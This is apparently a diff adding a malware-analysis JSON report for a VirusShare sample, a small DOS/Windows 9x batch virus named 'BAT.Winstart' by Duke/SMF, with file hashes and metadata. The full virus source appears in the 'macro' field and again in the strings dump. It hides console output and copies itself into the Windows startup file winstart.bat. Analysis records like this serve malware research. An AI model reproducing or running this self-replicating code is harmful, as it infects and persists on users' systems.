@@ -1,0 +1,53 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": ":YYY\n@ctty nul\nif \"%windir%==\" goto clo\nset f=%windir%\\winstart.bat\nif %0==%f% goto clo\nif not exist %f% goto typ\ntype 1>z1\ntype 2>z2\ntype 3>z3\necho :NNN>>%f%\ndel z? /p<%f%\nif exist z? goto zar\ngoto clo\n:BAT.Winstart (c) by Duke/SMF\n:zar\ndel z?\ntype %0>>%f%\ngoto clo\n:typ\ntype %0>%f%\n:clo\nctty con"
+    },
+    "filename": "VirusShare_4a545d8801f11ad6404ba450a9accf50",
+    "filesize": 320,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4a545d8801f11ad6404ba450a9accf50",
+        "sha1": "2317961c470623d96533cf2dfeb200dfd5a4f66d",
+        "sha256": "242f951b0aea00c267cffa6dccaf2a14454f5c48803eea4c1dd245bde8e6eb2d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ":YYY",
+            "@ctty nul",
+            "if \"%windir%==\" goto clo",
+            "set f=%windir%\\winstart.bat",
+            "if %0==%f% goto clo",
+            "if not exist %f% goto typ",
+            "type 1>z1",
+            "type 2>z2",
+            "type 3>z3",
+            "echo :NNN>>%f%",
+            "del z? /p<%f%",
+            "if exist z? goto zar",
+            "goto clo",
+            ":BAT.Winstart (c) by Duke/SMF",
+            ":zar",
+            "del z?",
+            "type %0>>%f%",
+            "goto clo",
+            ":typ",
+            "type %0>%f%",
+            ":clo",
+            "ctty con"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263265",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
